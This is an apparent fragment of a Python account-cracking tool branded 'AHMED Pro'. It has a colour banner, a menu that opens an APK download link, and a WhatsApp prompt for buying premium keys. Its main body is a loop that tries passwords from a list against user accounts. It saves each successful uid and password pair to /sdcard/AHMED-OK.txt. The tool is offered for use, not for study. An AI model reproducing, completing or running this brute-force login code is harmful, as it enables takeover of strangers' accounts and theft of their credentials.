...
\033[1;34m𝐏 \033[1;37m
 ...
 Version   : 0.1
----------------------------------------------
 AHMED Pro version 0.1
 For Haters: ALLAH IS GREAT 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AHMED_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=03497640669&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Aking Sir, I Need To Buy Your Paid AHMED PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python AHMED.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AHMED-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AHMED-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AHMED-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AHMED-OK] '+uid+' | '+pas+'\033[1;97m')
